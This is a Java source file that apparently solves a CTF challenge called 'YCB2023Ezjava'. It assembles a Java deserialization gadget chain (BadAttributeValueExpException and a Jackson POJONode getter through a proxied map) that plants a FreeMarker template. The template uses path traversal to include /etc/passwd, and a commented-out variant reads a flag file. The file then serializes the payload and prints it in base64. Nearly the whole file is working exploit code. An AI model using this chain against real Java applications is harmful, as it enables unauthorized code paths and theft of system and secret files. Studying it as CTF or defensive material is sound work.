package dev.silente.javashark.solution;

import com.ycbjava.Bean.HtmlBean;
import com.ycbjava.Utils.HtmlInvocationHandler;
import com.ycbjava.Utils.HtmlMap;
import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.SerializeUtils;

import java.lang.reflect.Proxy;
import java.util.Map;

public class YCB2023Ezjava {

    public static void main(String[] args) throws Exception {

        String filename = "index.ftl";
//        String content = "${name.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/flag').toURL().openStream().readAllBytes()?join(\" \")}";

        String content = "<#include \"../../../../../../../../.././../../etc/passwd\">";
        HtmlMap htmlMap = new HtmlMap();
        ReflectUtils.setFieldValue(htmlMap, "filename", filename);
        ReflectUtils.setFieldValue(htmlMap, "content", content);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, new HtmlInvocationHandler(htmlMap));
        HtmlBean htmlBean = new HtmlBean(null, "foo", "bar");
        htmlBean.HtmlMap = proxyMap;
        Object getter = GPOJONode.toString2Getter(htmlBean);
        Object tostring = GBadAttributeValueExpException.deserialize2ToString(getter);

        byte[] poc = SerializeUtils.serialize(tostring);

        System.out.println(MiscUtils.base64Encode(poc));

//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        byteArrayOutputStream.write(poc);
//        NewObjectInputStream objectInputStream = new NewObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
//        objectInputStream.readObject();

//        SerializeUtils.deserialize(poc);
    }
}
